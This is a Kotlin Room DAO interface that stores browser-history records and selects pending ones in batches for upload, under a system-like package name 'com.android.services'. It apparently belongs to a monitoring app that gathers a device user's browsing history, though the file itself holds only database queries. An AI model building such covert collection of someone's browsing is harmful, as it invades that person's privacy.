package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.BrowserHistory
import com.android.services.util.AppConstants

@Dao
interface BrowserHistoryDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(browserHistory: BrowserHistory)

    @Query("Update browser_history set status = :updated_browserHistory where id BETWEEN :startId AND :endId")
    fun updateBrowserHistory(updated_browserHistory: Int, startId: Int, endId: Int): Int

    @Query("Select * from browser_history where status = :status order by id ASC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllBrowserHistory(status: Int): List<BrowserHistory>

}